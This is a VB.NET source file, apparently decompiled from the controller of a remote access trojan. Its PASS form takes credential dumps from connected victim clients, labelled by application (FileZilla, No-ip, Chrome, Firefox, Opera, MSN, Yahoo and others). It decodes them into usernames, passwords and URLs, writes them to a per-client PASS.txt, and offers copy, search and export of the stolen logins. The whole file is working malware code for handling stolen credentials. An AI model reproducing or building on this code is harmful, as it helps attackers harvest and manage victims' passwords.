Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class PASS
    Private Bo As Boolean
    Private m_SortingColumn As ColumnHeader

    Private Sub CopyALLToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyALLToolStripMenuItem.Click
        Try
            Dim text As String = ("User=" & Me.L1.SelectedItems.Item(0).Text)
            [text] = String.Concat(New String() {[text], ChrW(13) & ChrW(10) & "Pass=", Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text, ChrW(13) & ChrW(10) & "URL=", Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text})
            If ([text].Length > 0) Then
                Clipboard.SetText([text])
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyPassToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyPassToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).SubItems.Item(1).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopySiteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopySiteToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyUserToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyUserToolStripMenuItem.Click
        Try
            If (Me.L1.SelectedItems.Item(0).Text.Length > 0) Then
                Clipboard.SetText(Me.L1.SelectedItems.Item(0).Text)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub FindToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FindToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Search", "", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator = Nothing
                Dim pass As New PASS
                pass.Name = "e"
                pass.Text = ("Search For '" & str & "'")
                pass.Show()
                Try
                    enumerator = Me.L1.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim num As Integer = 0
                        Do
                            If (Strings.InStr(current.SubItems.Item(num).Text.ToLower, str.ToLower, CompareMethod.Binary) > 0) Then
                                Dim item2 As ListViewItem = pass.L1.Items.Add(current.Text, current.ImageIndex)
                                Dim num3 As Integer = (current.SubItems.Count - 1)
                                Dim i As Integer = 1
                                Do While (i <= num3)
                                    item2.SubItems.Add(current.SubItems.Item(i).Text)
                                    i += 1
                                Loop
                                Continue Do
                            End If
                            num += 1
                        Loop While (num <= 2)
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
                PassToolStripMenuItem.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
                Me.FxCOLM(pass.L1)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Sub FxCOLM(ByVal L1 As ListView)
        Dim num2 As Integer = (L1.Columns.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            L1.Columns.Item(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
            i += 1
        Loop
    End Sub

    Private Sub InClipboardToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles InClipboardToolStripMenuItem.Click
        Try
            Dim text As String = Me.SV
            If ([text].Length > 0) Then
                Clipboard.SetText([text])
                Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub InDiskToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles InDiskToolStripMenuItem.Click
        Try
            If (Me.sf.ShowDialog = DialogResult.OK) Then
                File.WriteAllText(Me.sf.FileName, Me.SV)
                Interaction.MsgBox(Me.sf.FileName, MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        Dim ascending As SortOrder
        Dim header As ColumnHeader = Me.L1.Columns.Item(e.Column)
        If (Me.m_SortingColumn Is Nothing) Then
            ascending = SortOrder.Ascending
        Else
            If header.Equals(Me.m_SortingColumn) Then
                If Me.m_SortingColumn.Text.StartsWith("> ") Then
                    ascending = SortOrder.Descending
                Else
                    ascending = SortOrder.Ascending
                End If
            Else
                ascending = SortOrder.Ascending
            End If
            Me.m_SortingColumn.Text = Me.m_SortingColumn.Text.Substring(2)
        End If
        Me.m_SortingColumn = header
        If (ascending = SortOrder.Ascending) Then
            Me.m_SortingColumn.Text = ("> " & Me.m_SortingColumn.Text)
        Else
            Me.m_SortingColumn.Text = ("< " & Me.m_SortingColumn.Text)
        End If
        Me.L1.ListViewItemSorter = New clsListviewSorter(e.Column, ascending)
        Me.L1.Sort()
        Me.L1.ListViewItemSorter = Nothing
    End Sub

    Private Sub L1_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles L1.DoubleClick
        Try
            Dim text As String = Me.L1.SelectedItems.Item(0).SubItems.Item(2).Text
            If Not [text].Contains("://") Then
                [text] = ("http://" & [text])
            End If
            Process.Start([text])
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub L1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs) Handles L1.SelectedIndexChanged
    End Sub

    Private Sub Pass_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
    End Sub

    Private Sub Pass_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Resize
        Try
            Me.L1.Columns.Item(3).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub RemoveEmptyPWToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RemoveEmptyPWToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.L1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.SubItems.Item(1).Text = "") Then
                    current.Remove()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        PassToolStripMenuItem.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
    End Sub

    Public Function SV() As String
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = Me.L1.Items.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = String.Concat(New String() {str, "URL=", current.SubItems.Item(2).Text, ChrW(13) & ChrW(10) & "USER=", current.Text, ChrW(13) & ChrW(10) & "PASS=", current.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)})
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Return str
    End Function

    Private Sub ToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PassToolStripMenuItem.Click
        Me.Bo = True
        Me.L1.BringToFront()
    End Sub

    Public Sub XD(ByRef c As Client, ByRef S As String)
        Dim strArray2 As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
        Dim imageIndex As Integer = -1
        If Not Directory.Exists(c.Folder) Then
            Directory.CreateDirectory(c.Folder)
        End If
        Dim strArray As String() = New String() {"FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer"}
        Dim contents As String = ""
        Dim str2 As String
        For Each str2 In strArray2
            Try
                If (str2.Length > 0) Then
                    If (str2 = "*") Then
                        imageIndex += 1
                    Else
                        If Not str2.Contains(":") Then
                            str2 = FN.DEB(str2)
                        End If
                        Dim strArray3 As String() = Strings.Split(str2, ":", -1, CompareMethod.Binary)
                        If (strArray3.Length > 3) Then
                            strArray3 = Strings.Split(Strings.Replace(str2, (strArray3(0) & ":" & strArray3(1)), FN.ENB((strArray3(0) & ":" & strArray3(1))), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
                        End If
                        Dim item As New ListViewItem
                        item = Me.L1.Items.Add(FN.DEB(strArray3(1)), imageIndex)
                        item.SubItems.Add(FN.DEB(strArray3(2)))
                        item.SubItems.Add(FN.DEB(strArray3(0)))
                        item.SubItems.Add(strArray(imageIndex))
                        NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(ind.vno(c.L))}, Nothing, Nothing, Nothing, True)
                        contents = (contents & "USR: " & item.Text & ChrW(13) & ChrW(10))
                        contents = (contents & "PWD: " & item.SubItems.Item(1).Text & ChrW(13) & ChrW(10))
                        contents = (contents & "URL: " & item.SubItems.Item(2).Text & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10))
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        Next
        Try
            File.WriteAllText((c.Folder & "PASS.txt"), contents)
        Catch exception3 As Exception
            ProjectData.SetProjectError(exception3)
            Dim exception2 As Exception = exception3
            ProjectData.ClearProjectError()
        End Try
        Me.FxCOLM(Me.L1)
        PassToolStripMenuItem.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
    End Sub

End Class

Public Class clsListviewSorter
    Implements IComparer
    Private m_ColumnNumber As Integer
    Private m_SortOrder As SortOrder
    ' Methods
    Public Sub New(ByVal column_number As Integer, ByVal sort_order As SortOrder)
        Me.m_ColumnNumber = column_number
        Me.m_SortOrder = sort_order
    End Sub

    Public Function [Compare](ByVal x As Object, ByVal y As Object) As Integer Implements IComparer.Compare
        Dim text As String
        Dim str2 As String
        Dim item As ListViewItem = DirectCast(x, ListViewItem)
        Dim item2 As ListViewItem = DirectCast(y, ListViewItem)
        If (item.SubItems.Count <= Me.m_ColumnNumber) Then
            [text] = ""
        Else
            [text] = item.SubItems.Item(Me.m_ColumnNumber).Text
        End If
        If (item2.SubItems.Count <= Me.m_ColumnNumber) Then
            str2 = ""
        Else
            str2 = item2.SubItems.Item(Me.m_ColumnNumber).Text
        End If
        If (Me.m_SortOrder = SortOrder.Ascending) Then
            If (Versioned.IsNumeric([text]) And Versioned.IsNumeric(str2)) Then
                Return Conversion.Val([text]).CompareTo(Conversion.Val(str2))
            End If
            If (Information.IsDate([text]) And Information.IsDate(str2)) Then
                Return DateTime.Parse([text]).CompareTo(DateTime.Parse(str2))
            End If
            Return String.Compare([text], str2)
        End If
        If (Versioned.IsNumeric([text]) And Versioned.IsNumeric(str2)) Then
            Return Conversion.Val(str2).CompareTo(Conversion.Val([text]))
        End If
        If (Information.IsDate([text]) And Information.IsDate(str2)) Then
            Return DateTime.Parse(str2).CompareTo(DateTime.Parse([text]))
        End If
        Return String.Compare(str2, [text])
    End Function

End Class